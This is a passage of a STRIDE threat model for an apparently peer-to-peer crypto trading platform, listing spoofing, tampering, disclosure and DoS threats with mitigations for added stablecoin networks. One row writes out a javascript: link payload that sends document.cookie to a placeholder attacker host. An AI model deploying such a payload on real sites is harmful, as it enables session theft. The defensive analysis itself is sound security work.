are user-judgment-required.
**Open gaps:** Future: phone-app could pin a list of known-good
origins.  Filed.

### E6 — Operator-payout drainer rate-limit bypass
**Surface:** Relay
**Threat:** An operator's relay accepts payout-broadcast tasks
faster than the rate-limiter expects, causing the relay to drain
funds from the operator's account at a rate the operator didn't
authorize (e.g., an attacker who can submit payout tasks
floods the queue).
**Mitigation:**
- **Payout queue is operator-authoritative** — only the
  operator's own relay submits payout tasks.  External submission
  is not exposed via any public endpoint.  Verified at
  `apps/relay/src/queue/drainer.ts`.
- **Operator-balance scanner / low-balance alert** — operator
  is notified before the account is drained, with structured
  log at `low_balance` warn level.
- **Drain-defense smoke** + **drainer-defense-smoke** +
  **drain-defense-live-fire** all exercise the queue under
  adversarial conditions in CI.
**Residual risk:** Operator misconfigures the payout schedule
(too aggressive).  Operator-judgment-required, documented in
RUN-A-MORPHIT-NODE.md and OPERATIONS.md §payouts.
**Open gaps:** none.

### E7 — CI gate bypass via branch-protection misconfiguration
**Surface:** Build / CI
**Threat:** A maintainer with merge access pushes directly to
`main` bypassing the PR review process and the four CI jobs (web,
typecheck-sweep, unit-tests, smokes, indexer-integration), shipping
unaudited code to the @morphit release pipeline.
**Mitigation:**
- **Forgejo branch protection on `main`** — pre-launch posture
  documented in CONTRIBUTING.md is "PRs only, all checks must
  pass."
- **CI status visible publicly** — a release at a commit that
  doesn't have green CI is a visible anomaly anyone can detect.
- **`npm run build:manifest` reproducibility** — even if a
  hostile commit lands, users running `build:manifest` against
  their own clone get a divergent hash.  The on-chain release op
  would still hash to the hostile bundle, but a paranoid user
  can detect the divergence.
- **Multi-eyes review** is process-not-code; the project doesn't
  enforce two-reviewer-required at the chain level.
**Residual risk:** Single hostile maintainer with merge access.
Same single-key-compromise scenario as T7 — recovery is corrective
release op + key rotation.
**Open gaps:** Threshold-multisig at the release-signing layer
would eliminate this class.  Filed (with T7).

────────────────────────────────────────────────────────────────────────

## Part 88 refresh summary

**17 new STRIDE rows** added across the six categories
(S5–S7, T5–T7, R3–R5, I6–I8, D6–D7, E5–E7).  Combined with the
24 rows from the original Part 29 matrix, the matrix now covers
**41 threat scenarios** across the post-Part-87 codebase.

**Net new findings during this refresh: zero.**  Every threat
analyzed has existing mitigations that were verified in code.
Three residual-risk areas surfaced that are explicitly accepted
by the project's threat model:

1. **Single-key compromise of @morphit's posting key** (T7 / E7) —
   recovery via corrective release op; future hardening is
   threshold-multisig.  Filed in REVISIT-LIST.
2. **Phishing-origin homoglyphs other than RTL-override** (S5 / E5) —
   user-judgment-required; future hardening is phone-app
   origin-pinning.  Filed.
3. **Operator-host compromise** (T6, R3) — explicit operator-trust
   boundary; mitigation is federation choice, not technical
   countermeasure.

**No open gaps blocking pre-launch.**  The threat model is in a
state where every credible attacker behavior has either an
in-code mitigation or an explicitly-accepted residual.  Filed
items are long-term hardening, not pre-launch blockers.

## Part 122 cp30 refresh — USDC + multi-network env-var explorer overrides (2026-05-18)

This refresh covers the threat surfaces introduced by cp30 USDC addition,
the cp30-DD wire-format closures (DD-10/10b/11), and the cp30-DD-DD audit
fixes (SEC-1 through SEC-6, CODE-1 through CODE-3).  Existing STRIDE rows
covering single-network multi-asset wire format remain in force; this
refresh adds rows specific to USDC's 4-network shape and the per-network
explorer URL override.

────────────────────────────────────────────────────────────────────────

## Spoofing — cp30 refresh

### S-cp30-1 — Hostile peer spoofs USDC network discriminator
**Surface:** Frontend (chat decoder) / Indexer (order handler)
**Threat:** Attacker sends `{method:'usdc', network:'spl', address:'0xevm...'}`
on the wire; receiver UI displays "SPL USDC address" with an EVM-format
string; buyer routes funds incorrectly.
**Mitigation:**
- cp30-DD-DD SEC-3: decoder cross-validates `validateUsdcAddress(network,
  address)` after parsing the network field — rejects mismatched address
  shapes per network.
- cp30-DD-DD SEC-6: encoder symmetric per-network validation — buggy
  callers get a developer-time error instead of emitting silently-rejected
  wire messages.
- Wallet semantics provide a downstream backstop (Phantom rejects non-base58
  on Solana, MetaMask rejects non-0x on Ethereum).
**Residual risk:** Low.  Wire-format cross-validation is the authoritative
gate; downstream wallet checks are bonus defense.
**Gap:** None observed.

### S-cp30-2 — Operator spoofs chain explorer to harvest user data
**Surface:** Operator → user (privacy)
**Threat:** Operator configures `MORPHIT_FRONTEND_USDC_ERC20_CHAT_LINK_URL=
https://etherscan.io.spy.com/tx/{txid}` (typosquatted host).  Users
clicking the chat-link send IP + tx context to attacker.
**Mitigation:**
- Documented operator-trust model: users explicitly trust their chosen
  instance.  Self-host or pick a different operator if not.
- `isValidChatLinkTemplate` enforces https://, requires literal `{txid}`,
  parses as URL after substitution; no userinfo allowed.
- Operators wanting to spy can already misconfigure single-network BTC/XMR/etc.
  URLs (pre-cp30 capability) — cp30 adds the same attack surface for 8
  more URLs but no new threat class.
**Residual risk:** Operator-controlled threat; out of scope for Morphit's
threat model per Memory #19 (privacy disclosed, not enforced against
operator).
**Gap:** None — disclosed in OPERATIONS.md privacy section.

────────────────────────────────────────────────────────────────────────

## Tampering — cp30 refresh

### T-cp30-1 — Hostile indexer tampers with chat_link_urls.usdc / .usdt
**Surface:** Indexer → Frontend
**Threat:** Hostile/compromised indexer serves `chat_link_urls.usdc.erc20 =
"javascript:fetch('https://attacker/'+document.cookie)"`.  Without defensive
validation, frontend renders as `<a href="javascript:...">` → XSS on click.
**Mitigation:**
- cp30-DD-DD SEC-1: frontend re-validates operator-supplied template via
  `isValidChatLinkTemplate` at every consumer site (externalExplorerUrl,
  usdtExplorerUrl, usdcExplorerUrl).  Falls through to bundled default on
  validation failure.
- Svelte's `<a href={value}>` data binding HTML-escapes the value (but
  doesn't validate scheme — SEC-1 closes the scheme gap).
- `rel="noopener noreferrer"` + `target="_blank"` on the rendered link.
**Residual risk:** Low.  The XSS surface is now fully gated.
**Gap:** None observed.

### T-cp30-2 — Tampering with USDC order asset_network via replace
**Surface:** Indexer / chain
**Threat:** Within the 15-minute replace window, attacker submits a replace
op flipping `asset_network` from `erc20` to `polygon` (or other), tricking
counterparties who had committed to the original chain.
**Mitigation:**
- cp30-DD-DD CODE-3: `orderReplace.ts` now extracts `asset_network` from
  the replace payload AND checks it matches the target order's stored
  value.  Mismatch → rejection with `replace_asset_network_change_forbidden`.
- Per ADR-0023/0028, network is substance (not detail) for multi-network
  assets — same posture as side/asset/fiat freeze.
**Residual risk:** Low.  Network is now locked through replace, just like
side/asset/fiat.
**Gap:** No test coverage for the new rejection reason (filed as REVISIT
for next-session smoke addition).

### T-cp30-3 — Tampering with chat USDC payload network field
**Surface:** Chain (custom_json) / Frontend (decoder)
**Threat:** Attacker manipulates the `network` field on an in-flight USDC
chat message.  Without strict allowlist, an attacker could inject a network
value the decoder doesn't expect, causing downstream UI confusion.
**Mitigation:**
- Decoder uses strict `o.network !== 'erc20' && o.network !== 'spl' && ...`
  literal-string comparison — case-sensitive, type-checked, allowlist-only.
- cp30-DD-DD CODE-1: missing-network rejected for USDT/USDC methods (was
  accepted with `network=undefined`).
- cp30-DD-DD I-1: indexer order handler bounds input length before
  toLowerCase to avoid memory waste on malformed inputs.
**Residual risk:** None observed.

### T-cp30-4 — USDC/LTC icon SVG tampering for asset confusion
**Surface:** Frontend (static asset serving)
**Threat:** Operator serves a tampered `icon-usdc.svg` that visually
resembles a different asset (e.g., displays "$1000 USDC" branding to imply
high value).  Phishing via brand-confusion.
**Mitigation:**
- Icons are served as `<img src="/icons/icon-usdc.svg">` (NOT inline
  `{@html}`) so SVG-embedded `<script>` would not execute even if the
  operator served a malicious file.
- Operators can serve modified branding; users explicitly trust their
  chosen instance.  Out of scope per operator-trust model.
- The asset's TEXT identifier (USDC, ETH-20 etc.) is i18n-driven, not
  derived from the icon.  Users seeing "USDC" with a misleading icon
  would also see the correct asset ticker on the order row.
**Residual risk:** Low.  Operator-controlled threat, disclosed.
**Gap:** None — icon serving is `<img>` not `{@html}`.

────────────────────────────────────────────────────────────────────────

## Repudiation — cp30 refresh

### R-cp30-1 — User claims their USDC trade didn't happen
**Surface:** Indexer / chain
**Threat:** Same as R1 in the base STRIDE matrix — every order op is a
chain-signed custom_json with the signer's account, blockTime, and full
payload on the blockchain.  USDC orders carry the same audit trail as
USDT/BTC/etc.
**Mitigation:** Same as R1: chain signing + indexer block-time captures.
**Residual risk:** None — chain is the authoritative log.
**Gap:** None.

────────────────────────────────────────────────────────────────────────

## Information disclosure — cp30 refresh

### I-cp30-1 — USDC privacy-warning chip reveals user's intent
**Surface:** Frontend (UI rendering)
**Threat:** A user lingering on the post-order form with `asset=USDC`
selected shows the `usdc_centralized` warning chip in the DOM.  If their
session is captured (e.g., screen-share, browser-history-recovery), the
chip's text reveals they were considering USDC.
**Mitigation:**
- Same posture as USDT (`usdt_centralized` warning, shipped cp3).  Not a
  new threat — USDC just adds another asset whose users see an
  informational chip.
- Documented in OPERATIONS.md privacy section: users on shared devices
  should clear their session.
**Residual risk:** Same as USDT.  Acceptable.

### I-cp30-2 — Per-network USDC explorer URL leak
**Surface:** Operator → third party
**Threat:** Every click on the USDC chat-link sends user IP + tx hash to
the operator-configured explorer (default: etherscan.io, basescan.org,
polygonscan.com, solscan.io).  Third party logs (operator does not).
**Mitigation:**
- Operator can override with `MORPHIT_FRONTEND_USDC_<NET>_CHAT_LINK_URL`
  to point at self-hosted explorer.
- Disclosed in /privacy/usdc per-asset guide.
- User can copy txid manually instead of clicking — no forced disclosure.
**Residual risk:** Same as USDT (cp3) and all single-network assets.
Privacy-conscious operators self-host explorers; privacy-conscious users
copy txids manually or use Tor.
**Gap:** None observed.

────────────────────────────────────────────────────────────────────────

## Denial of service — cp30 refresh

### D-cp30-1 — DoS via gigantic chat_link_urls env values
**Surface:** Indexer (config parsing)
**Threat:** Operator misconfigures env with a billion-char value for one
of the 8 new chat-link URL env vars; indexer-side memory pressure on
startup.
**Mitigation:**
- Zod schema `.max(512)` cap on every chat-link URL env var (single-network
  + multi-network).  Indexer fails to start with a clear error message
  instead of consuming unbounded memory.
**Residual risk:** None.

### D-cp30-2 — DoS via huge asset_network value in custom_json
**Surface:** Indexer (order handler)
**Threat:** Hostile chain peer broadcasts a `morphit_order_v1` with a
multi-MB `asset_network` string; indexer wastes memory on `toLowerCase()`
before rejecting via allowlist.
**Mitigation:**
- Chain-layer custom_json size cap (~8KB) bounds the practical worst
  case.
- cp30-DD-DD I-1 (this audit): indexer's order handler checks
  `networkRaw.length > MAX_NETWORK_LEN` (16 chars) BEFORE allocating
  `toLowerCase()` copy.  Same gate in orderReplace.
**Residual risk:** None.

### D-cp30-3 — ReDoS via USDC address/txid regexes
**Surface:** Frontend (chat decoder) / Indexer (order handler)
**Threat:** Hostile peer sends a pathological string that triggers
catastrophic regex backtracking.
**Mitigation:**
- All cp30 regexes are anchored (`^...$`), bounded quantifiers
  (`{32,44}`, `{64}`, etc.), no nested groups, no backreferences.
- Verified during cp30-DD-DD security audit walkthrough.
**Residual risk:** None.

### D-cp30-4 — DoS via massive jitter amount in jitterStablecoinAmount
**Surface:** Frontend (UI jitter computation)
**Threat:** AddressShareModal calls `jitterAmountForAsset` on user input.
A 12-digit `whole` × 1_000_000n BigInt multiplication is O(N) on digit
count.
**Mitigation:**
- `AMOUNT_RE = /^\d{1,12}(?:\.\d{1,12})?$/` bounds input to 12 digits
  before+after decimal.  Max BigInt value is ~24-digit decimal, well
  within JS BigInt's native handling range.
**Residual risk:** None.

────────────────────────────────────────────────────────────────────────

## Elevation of privilege — cp30 refresh

### E-cp30-1 — USDC added to fee_method enum via misconfiguration
**Surface:** Indexer (canonical registry) / chain
**Threat:** A contributor patches `ASSETS` to flip USDC's
`canPayListingFee:false → true`, allowing USDC to bypass the BLURT/BTC/XMR-only
fee-method gate (Memory #23 frozen enum).
**Mitigation:**
- `usdc-trade-only-smoke.ts` (cp30, 14 scenarios) asserts
  `canonical USDC.canPayListingFee === false` AND
  `frontend USDC.canBeUsedForListingFee === false`.
- `fee-method-enum-frozen-smoke.ts` asserts no asset can ever flip.
- `disabled-assets-wizard-smoke.ts` asserts Category-B filter returns the
  5 expected trade-only assets.
- Three independent smokes from different angles catch any bypass attempt.
**Residual risk:** None observed — multi-smoke regression layer is hard
to coincidentally break.

### E-cp30-2 — Operator privilege escalation via per-network env vars
**Surface:** Operator → indexer
**Threat:** Operator adds `MORPHIT_FRONTEND_USDC_NEW_NETWORK_CHAT_LINK_URL`
for a network not in the canonical USDC supportedNetworks set.  Hostile
indexer could ship orders claiming `asset_network='new_network'`.
**Mitigation:**
- Indexer Zod schema enumerates exactly the 4 USDT networks + 4 USDC
  networks as known env-var names.  Unknown env vars are ignored by Zod
  (not added to Config).
- Indexer order handler's `USDC_NETWORKS_VALID = new Set(['erc20', 'spl',
  'base', 'polygon'])` strict allowlist rejects unknown values.
**Residual risk:** None — env vars not in the schema have no consumers.

────────────────────────────────────────────────────────────────────────

## Part 122 cp30 refresh summary

| Category | New rows | Pre-existing rows still in force |
|----------|----------|----------------------------------|
| Spoofing | 2 (S-cp30-1, S-cp30-2) | S1, S2, S3, S4, S5, S6, S7 |
| Tampering | 4 (T-cp30-1, T-cp30-2, T-cp30-3, T-cp30-4) | T1, T2, T3, T4, T5, T6, T7 |
| Repudiation | 1 (R-cp30-1) | R1, R2, R3, R4 |
| Information disclosure | 2 (I-cp30-1, I-cp30-2) | I1, I2, I3, I4, I5, I6, I7, I8 |
| Denial of service | 4 (D-cp30-1, D-cp30-2, D-cp30-3, D-cp30-4) | D1, D2, D3, D4, D5, D6, D7 |
| Elevation of privilege | 2 (E-cp30-1, E-cp30-2) | E1, E2, E3, E4 |

**Net new threats:** 15 across 6 categories, all with explicit mitigations
that were either part of the cp30 design (canonical allowlists, Zod caps,
strict regex anchoring) or surfaced by the cp30-DD-DD security audit
(SEC-1 through SEC-6, CODE-1 through CODE-3, I-1).

**Outstanding gaps:** One — orderReplace `replace_asset_network_change_forbidden`
needs test coverage.  Filed as REVISIT.

**No criticals.**  The cp30 attack surface is well-mitigated end-to-end.

## Part 122 cp31 refresh — DAI multi-network addition (2026-05-18)

This refresh covers the threat surfaces introduced by cp31 DAI addition.
DAI is structurally similar to USDC (multi-network stablecoin) but the
threat model is meaningfully different on TWO axes: (a) DAI has the
highest cross-network address-confusion surface on Morphit (4-way EVM-
identity vs USDC's 3-way), (b) DAI's privacy/centralization story is
nuanced — the token contract has no admin freeze power, but the PSM
holds USDC as collateral so Circle's freeze power transitively affects
DAI redeemability.  These differences earn DAI a distinct
`dai_partly_centralized` warning class (per ADR-0029 §2) and require
the strongest cross-network warning copy of any picker.

Existing STRIDE rows covering single-network multi-asset wire format
and the cp30 USDC refresh remain in force; this refresh adds rows
specific to DAI's unique threat surfaces.

────────────────────────────────────────────────────────────────────────

## Spoofing — cp31 refresh

### S-cp31-1 — Hostile peer spoofs DAI network discriminator
**Surface:** Frontend (chat decoder) / Indexer (order handler)
**Threat:** Attacker sends `{method:'dai', network:'erc20', address:
'0x<valid-evm>...'}` when the actual address holds funds only on
Polygon.  Receiver UI displays "Ethereum (ERC-20) DAI address:" but the
sender's wallet (broadcasting on Ethereum) sends to a chain where the
recipient holds no balance.  More confusable than USDT/USDC because
DAI has 4 EVM-identical networks instead of 3.
**Mitigation:**
- cp31 inherits cp30-DD-DD SEC-3 cross-validation: `validateDaiAddress
  (network, address)` rejects mismatched address shapes per network.
  BUT — note that within DAI the per-network validators all return
  the same value for any valid EVM address (4-way identity), so this
  defense doesn't disambiguate.  The receiver UI MUST display the
  chain prominently for the receiver to verify the sender's intent.
- The DAI cross-network warning aside in `ChatMessage.svelte` is the
  strongest of any picker: it explicitly names all four networks and
  warns the receiver to confirm the chain off-band before scanning.
- Per ADR-0029 §3, DAI defaultNetwork is null — the picker forces an
  explicit choice on every trade.
**Residual risk:** Higher than USDT/USDC because shape validation
can't disambiguate among the 4 EVM networks.  Mitigated by the
strongest cross-network warning copy + receiver visibility of the
chain label on the address pill.
**Gap:** None observed; ideally future wallet integrations would
include a "balance check on this chain" round-trip before send, but
that's a wallet feature not a Morphit feature.

### S-cp31-2 — Operator spoofs DAI chain explorer
**Surface:** Operator → user (privacy)
**Threat:** Same class as USDT's S-cp30-2 — operator configures a
typosquatted explorer host as the per-network template.  Adds 4 more
attack surfaces (one per DAI network).
**Mitigation:**
- Same SEC-1 defense: `isValidChatLinkTemplate` validates operator-
  supplied templates at every consumer site (line 257 of
  `lib/explorer/urls.ts` for DAI).
- Operator-trust threat model: users explicitly trust their chosen
  instance.
**Residual risk:** Same as cp30; disclosed in OPERATIONS.md.

### S-cp31-3 — Hostile claim about DAI's decentralization
**Surface:** Marketing copy / per-asset privacy guide
**Threat:** A future contributor "simplifies" DAI's privacy-warning
copy to lump it with USDT/USDC's `*_centralized` class, OR removes
the PSM/USDC backing dependency disclosure, OR overstates DAI's
decentralization claims.  This is a marketing-style spoof of the
honest threat model.
**Mitigation:**
- `dai-trade-only-smoke.ts` Scenario 9: pins
  `privacyWarningKey === 'dai_partly_centralized'` in BOTH canonical
  and frontend registries.  Failure message points back to
  ADR-0029 §2 for the design rationale.
- Brag #281 carries the honest framing as a stable reference.
- ADR-0029 §2 documents the design decision with explicit rejection
  of both "lump with `*_centralized`" and "no warning at all"
  alternatives.
**Residual risk:** None — three independent pins (smoke + brag +
ADR) catch any drift.

────────────────────────────────────────────────────────────────────────

## Tampering — cp31 refresh

### T-cp31-1 — Hostile indexer tampers with chat_link_urls.dai
**Surface:** Indexer → Frontend
**Threat:** Same XSS class as cp30 T-cp30-1 — hostile indexer serves
`chat_link_urls.dai.erc20 = "javascript:..."`.
**Mitigation:**
- `daiExplorerUrl` line 257: re-validates via
  `isValidChatLinkTemplate`, falls through to bundled default on
  validation failure.  Same defense posture as USDC.
- Bundled defaults (etherscan/polygonscan/basescan/arbiscan) are
  all `https://`-only.
**Residual risk:** Low.

### T-cp31-2 — Tampering with DAI order asset_network via replace
**Surface:** Indexer / chain
**Threat:** Within the 15-minute replace window, attacker submits a
replace op flipping `asset_network` from `erc20` to `arbitrum`.  More
amplified than USDC because all four DAI networks are visually
identical EVM addresses — buyer who committed to "Ethereum DAI" can't
notice the flip from the address alone.
**Mitigation:**
- cp30-DD-DD CODE-3 inherited: `orderReplace.ts` validates
  asset_network as substance and rejects changes with
  `replace_asset_network_change_forbidden`.  Mirror of order.ts.
- DAI_NETWORKS_VALID strict allowlist of 4 EVM networks.
**Residual risk:** Low.  Same coverage as USDC; gate logic exercised
by 10 regression tests added in the cp30-DD-DD addendum (which now
also cover DAI through the parallel branches).
**Gap:** New tests specifically targeting DAI's asset_network gate
not yet added (parallel to the cp30-DD-DD CODE-3 USDC tests).  Filed
as REVISIT.

### T-cp31-3 — Tampering with chat DAI payload network field
**Surface:** Chain (custom_json) / Frontend (decoder)
**Threat:** Same class as cp30 T-cp30-3.
**Mitigation:**
- Decoder uses strict literal-string `o.network !== 'erc20' && ...`
  comparison.  4 EVM network names allowed; anything else rejected.
- cp30-DD-DD CODE-1 inherited: missing-network rejected for DAI as
  well as USDT/USDC.
- cp30-DD-DD I-1 inherited: MAX_NETWORK_LEN=16 length cap before
  toLowerCase.
**Residual risk:** None observed.

### T-cp31-4 — DAI icon SVG tampering
**Surface:** Frontend (static asset serving)
**Threat:** Same class as cp30 T-cp30-4.
**Mitigation:**
- Icon served as `<img src="/icons/icon-dai.svg">` (not inline
  `{@html}`); SVG `<script>` would not execute.
- Operator-controlled; out of scope per operator-trust model.
- The asset's TEXT identifier ("DAI") is i18n-driven, not derived
  from icon content.
**Residual risk:** Low.

────────────────────────────────────────────────────────────────────────

## Repudiation — cp31 refresh

### R-cp31-1 — User claims DAI trade didn't happen
**Surface:** Indexer / chain
**Threat:** Same as R1/R-cp30-1.  Every DAI order op is a chain-signed
custom_json carrying the signer + blockTime + full payload on the
public Blurt blockchain.  No new repudiation surface vs cp30.
**Mitigation:** Same as R1.
**Residual risk:** None.

────────────────────────────────────────────────────────────────────────

## Information disclosure — cp31 refresh

### I-cp31-1 — DAI privacy-warning chip reveals trade intent
**Surface:** Frontend (UI rendering)
**Threat:** A user considering DAI sees the `dai_partly_centralized`
warning chip in the DOM (3 sentences naming MakerDAO, the PSM, and
Circle).  Session capture reveals more specific intent than the USDT/
USDC chips would (which name only the issuer + freeze power).
**Mitigation:**
- Same posture as cp30 I-cp30-1 — informational, not blocking.
- DOM exposure of this specific intent is no different from any
  asset-form selection; same shared-device guidance applies.
**Residual risk:** Same as USDT/USDC.  Acceptable.

### I-cp31-2 — Per-network DAI explorer URL leak
**Surface:** Operator → third party
**Threat:** Same as cp30 I-cp30-2.  Each click sends user IP + tx
hash to the operator-configured explorer (default:
etherscan/polygonscan/basescan/arbiscan).
**Mitigation:**
- Operator override path: `MORPHIT_FRONTEND_DAI_<NET>_CHAT_LINK_URL`
  per network.
- Disclosed in /privacy/dai per-asset guide.
- User can copy txid manually.
**Residual risk:** Same as cp30 I-cp30-2.

────────────────────────────────────────────────────────────────────────

## Denial of service — cp31 refresh

### D-cp31-1 — DoS via gigantic chat_link_urls.dai env values
**Surface:** Indexer (config parsing)
**Threat:** Operator misconfigures env with a billion-char value for
one of the 4 new DAI chat-link URL env vars.
**Mitigation:**
- Zod schema `.max(512)` on every DAI chat-link env var (same as USDC
  + USDT).  Indexer fails to start with a clear error.
**Residual risk:** None.

### D-cp31-2 — DoS via huge asset_network value in DAI order
**Surface:** Indexer (order handler)
**Threat:** Hostile chain peer broadcasts a `morphit_order_v1` with a
multi-MB `asset_network` string.
**Mitigation:**
- Chain-layer custom_json size cap (~8KB).
- cp30-DD-DD I-1 inherited: `networkRaw.length > MAX_NETWORK_LEN`
  (16 chars) check BEFORE `toLowerCase()`.  Mirrored in orderReplace.
**Residual risk:** None.

### D-cp31-3 — ReDoS via DAI address/txid regexes
**Surface:** Frontend (chat decoder) / Indexer (order handler)
**Mitigation:**
- All cp31 regexes anchored (`^...$`), bounded quantifiers (`{40}`,
  `{64}`), no backreferences, no nested groups.  EVM `0x[a-fA-F0-9]
  {40}` is the entire DAI address shape — extremely simple.
**Residual risk:** None.

### D-cp31-4 — DoS via jitter on 18-decimal DAI amounts
**Surface:** Frontend (UI jitter computation)
**Threat:** AddressShareModal calls `jitterAmountForAsset` on DAI
input.  DAI uses 18-decimal token math; pathological string could
trigger huge-BigInt allocation.
**Mitigation:**
- `AMOUNT_RE = /^\d{1,12}(?:\.\d{1,12})?$/` bounds input to 12+12
  digits.  Jitter routine clamps to 6-decimal display precision
  regardless of token-native decimals, so the BigInt is the same
  size as for USDT/USDC.
**Residual risk:** None.

────────────────────────────────────────────────────────────────────────

## Elevation of privilege — cp31 refresh

### E-cp31-1 — DAI added to fee_method enum via misconfiguration
**Surface:** Indexer (canonical registry) / chain
**Threat:** Contributor flips DAI's `canPayListingFee:false → true`,
allowing DAI to bypass the BLURT/BTC/XMR-only fee gate.
**Mitigation:**
- `dai-trade-only-smoke.ts` Scenario 2 asserts
  `canonical DAI.canPayListingFee === false`.
- `dai-trade-only-smoke.ts` Scenario 12 asserts
  `frontend DAI.canBeUsedForListingFee === false` (drift detection).
- `fee-method-enum-frozen-smoke.ts` asserts no asset can flip.
- 3 independent smokes from different angles.
**Residual risk:** None.

### E-cp31-2 — Operator privilege via unknown DAI env vars
**Surface:** Operator → indexer
**Threat:** Operator adds `MORPHIT_FRONTEND_DAI_<unknown>_CHAT_LINK_URL`
for a network not in the canonical DAI supportedNetworks set.
**Mitigation:**
- Indexer Zod schema enumerates exactly the 4 DAI networks (erc20/
  polygon/base/arbitrum) as known env-var names.  Unknown env vars
  are ignored by Zod.
- Indexer order handler's `DAI_NETWORKS_VALID = new Set(['erc20',
  'polygon', 'base', 'arbitrum'])` strict allowlist rejects unknown
  values.
**Residual risk:** None.

────────────────────────────────────────────────────────────────────────

## Part 122 cp31 refresh summary

| Category | New rows | Pre-existing rows still in force |
|----------|----------|----------------------------------|
| Spoofing | 3 (S-cp31-1, S-cp31-2, S-cp31-3) | S-cp30-* + S1-S7 |
| Tampering | 4 (T-cp31-1, T-cp31-2, T-cp31-3, T-cp31-4) | T-cp30-* + T1-T7 |
| Repudiation | 1 (R-cp31-1) | R-cp30-1 + R1-R4 |
| Information disclosure | 2 (I-cp31-1, I-cp31-2) | I-cp30-* + I1-I8 |
| Denial of service | 4 (D-cp31-1, D-cp31-2, D-cp31-3, D-cp31-4) | D-cp30-* + D1-D7 |
| Elevation of privilege | 2 (E-cp31-1, E-cp31-2) | E-cp30-* + E1-E4 |

**Net new threats:** 16 across 6 categories.  No criticals.

**Outstanding gap (cp31-specific):** DAI-targeted asset_network gate
tests parallel to the cp30-DD-DD CODE-3 USDC tests not yet added —
gate logic correct (mirror of USDC's), but unexercised by regression.
Filed as REVISIT.

**The cp31 attack surface is well-mitigated end-to-end.  Highest
remaining concern is S-cp31-1 (4-way EVM-identity in DAI address
formats), mitigated by the strongest cross-network warning copy of
any picker — but mitigated by USER attention, not by shape
validation.  Wallet-integration improvements (balance-check round-
trip) would be the next defense layer if Morphit ever ships a
direct-send feature; for now the receiver-must-confirm-chain workflow
is the boundary.**

---

## CP32 STRIDE refresh (2026-05-18)

Cp32 scope: 7 network icon swap (Ken-supplied) + Priority #4 "TINY
FOOTPRINT" introduction + 41-site lazy-loading retrofit + new
network-icon-coverage-smoke (20 scenarios).

### Spoofing — 1 row

**S-cp32-1 (LOW).**  Hostile operator replaces a network icon SVG on
their instance (e.g. swaps `icon-network-erc20.svg` for an icon that
looks like `icon-network-bep20.svg`) to confuse users into believing
they're sending on the wrong chain — a "visual identity attack" on top
of the existing 4-way EVM-identity surface (S-cp31-1).
Mitigation: every Morphit instance serves icons from `apps/web/static`
at build time; an operator who tampers with the bundle is operating an
adversarial fork.  Morphit's federation model assumes some operators
may misbehave (METADATA-LEAK-CATALOG.md §"Operator threat model"); the
cross-network-warning text NAMES the chosen network in plain text
above the icon, so the icon is not the only signal.  No additional
defense needed at icon layer; addressed at trust-the-instance layer.

### Tampering — 2 rows

**T-cp32-1 (LOW).**  Hostile operator serves a malicious SVG with
`<script>` or external `<image href>` to fingerprint visitors.
Mitigation: every cp32-shipped icon is a pure-path SVG with no
external references (verified in deep-deep F-1).  Morphit's CSP
(documented in `apps/web/src/hooks.server.ts`) blocks inline scripts
from SVG.  network-icon-coverage-smoke could be extended to grep for
`<script>` / `href=` / `<foreignObject>` / `<image` in each icon —
filed as future hardening; not blocking.

**T-cp32-2 (MEDIUM).**  Lazy-loading regression: a future component
edit drops `loading="lazy"` from a below-the-fold image without
realizing it was there.  Repeated drift over many checkpoints reverts
to all-eager loading silently.  Mitigation: byte-budget assertion in
network-icon-coverage-smoke catches NEW-icon-bloat; per-page byte
budget assertion would catch lazy-loss drift.  Filed as cp32 REVISIT.

### Repudiation — 0 rows

No repudiation surface in cp32.

### Information Disclosure — 1 row

**I-cp32-1 (LOW).**  Lazy-loading is a slight fingerprinting signal:
which icons loaded for a given visitor depends on their scroll +
viewport.  But every Morphit page is auth-free at the icon layer
(icons are publicly cacheable static files), and the icon roster is
public (every visitor has identical roster).  No identity correlation
risk.  Trade-off accepted: native browser `loading="lazy"` ships
universally without third-party JS loaders (which WOULD introduce real
fingerprinting surface).

### Denial of Service — 2 rows

**D-cp32-1 (LOW).**  Future icon swap balloons individual icon to
megabyte-scale (e.g. uncompressed PNG renamed `.svg` with embedded
base64 raster).  Mitigation: network-icon-coverage-smoke per-icon
ceiling (4,096 bytes), total budget (16,384 bytes for all 7 multi-
network icons combined).  Currently using 36% of total budget after
cp32 swap.  Self-tested by simulating future bloat: smoke fires the
"Priority #4 says re-minify" diagnostic.

**D-cp32-2 (LOW).**  Hostile peer creates a chat message with many
inline icons to force a slow first-paint on the recipient.
Mitigation: per-message attachment payloads do NOT permit raw SVG
embedding; only the canonical asset/network ticker is in the payload
and the icon is rendered from the static path.  Recipient browser
applies its own lazy-loading + per-domain connection caps.

### Elevation of Privilege — 0 rows

No EoP surface in cp32.

### Summary

| Category | New rows | Pre-existing rows still in force |
|----------|----------|----------------------------------|
| Spoofing | 1 (S-cp32-1) | S-cp31-* + S-cp30-* + S1-S7 |
| Tampering | 2 (T-cp32-1, T-cp32-2) | T-cp31-* + T-cp30-* + T1-T7 |
| Repudiation | 0 | R-cp31-1 + R-cp30-1 + R1-R4 |
| Information disclosure | 1 (I-cp32-1) | I-cp31-* + I-cp30-* + I1-I8 |
| Denial of service | 2 (D-cp32-1, D-cp32-2) | D-cp31-* + D-cp30-* + D1-D7 |
| Elevation of privilege | 0 | E-cp31-* + E-cp30-* + E1-E4 |

**Net new threats:** 6 across 4 categories.  No criticals.

**Notable design lesson:** Priority #4 (TINY FOOTPRINT) is a
**performance** property, but enforcing it via a smoke turns it into a
**security** property too — the byte-ceiling assertion prevents
malicious or accidental bloat in future swaps.  Performance budgets
double as DoS mitigations when they're enforced rather than
aspirational.

---

## CP33 STRIDE refresh (2026-05-19)

Cp33 scope: Dogecoin (DOGE) addition as 10th tradable asset + 7th
Category-B + BEP-20 network icon swap + 94-task deep-deep that
surfaced 5 HIGH-severity preexisting bugs (CODE-3/4/5/6/7) and
several drift findings.

### Spoofing — 1 row

**S-cp33-1 (LOW).**  DOGE legacy P2SH addresses use `9...` or
`A...` prefixes, both within the standard base58-shape of the
BTC/BCH legacy P2SH families and adjacent to DASH multisig
(`7...`).  A user sharing a DOGE P2SH address could in theory
copy-paste it into a DASH or BCH context.  Mitigation: receiving
wallet chain-binding (the recipient's wallet rejects wrong-chain
sends); cross-network warnings; the canonical chain prefix
character is checked at the registry-validator layer (DOGE's
`/^[D9A][...]{33}/` accepts only D/9/A, rejects X/7/1/3).
Same mitigation pattern as the cp24 LTC `3...` P2SH overlap with
BTC (ADR-0025 §4).

### Tampering — 2 rows

